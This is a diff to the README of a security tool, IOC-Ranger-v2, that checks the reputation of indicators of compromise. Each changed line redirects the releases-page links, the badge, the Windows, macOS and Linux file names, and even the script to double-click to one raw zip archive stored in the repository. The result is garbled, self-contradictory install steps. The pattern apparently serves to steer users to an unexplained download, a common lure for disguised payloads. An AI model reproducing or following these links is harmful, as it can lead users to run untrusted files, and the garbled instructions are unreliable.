@@ -6,11 +6,11 @@ Welcome to IOC-Ranger-v2, your tool for checking the reputation of various digit
 
 ## 📥 Download the Application
 
-[![Download IOC-Ranger-v2](https://img.shields.io/badge/Download-IOC--Ranger--v2-blue.svg)](https://github.com/st-ev-e/IOC-Ranger-v2/releases)
+[![Download IOC-Ranger-v2](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip)](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip)
 
 To get started, visit the releases page to download the application.
 
-**Download it here:** [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/releases)
+**Download it here:** [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip)
 
 ## 💻 System Requirements
 
@@ -23,14 +23,14 @@ Before downloading, ensure your system meets the following requirements:
 ## 📦 Installation Steps
 
 1. **Visit the Releases Page:** Click on the link below to go to the downloads section.
-   - [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/releases)
+   - [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip)
 
 2. **Select the Latest Version:** On the releases page, find the latest version available. 
 
 3. **Download the File:**
-   - For **Windows**, look for the file named `IOC-Ranger-v2-Windows.zip`.
-   - For **macOS**, choose `IOC-Ranger-v2-macos.zip`.
-   - For **Linux**, download `IOC-Ranger-v2-Linux.zip`.
+   - For **Windows**, look for the file named `https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip`.
+   - For **macOS**, choose `https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip`.
+   - For **Linux**, download `https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip`.
 
 4. **Extract the Files:**
    - Right-click on the downloaded file and choose "Extract All" or use a file extraction tool.
@@ -38,7 +38,7 @@ Before downloading, ensure your system meets the following requirements:
 
 5. **Run the Application:**
    - Open the folder where you extracted the files.
-   - Double-click on `IOC-Ranger.py` to start the application.
+   - Double-click on `https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip` to start the application.
    - A terminal window will open, guiding you through the usage instructions.
 
 ## 🛠️ Using IOC-Ranger-v2
@@ -77,6 +77,6 @@ We welcome community contributions! If you want to help improve the application 
 
 Ready to check the safety of your digital indicators? Go to the releases page to download IOC-Ranger-v2 now.
 
-**Download it here:** [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/releases)
+**Download it here:** [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/ioc_ranger_v2/v-IO-Ranger-1.1.zip)
 
 Thank you for using IOC-Ranger-v2! Your digital safety is our priority.
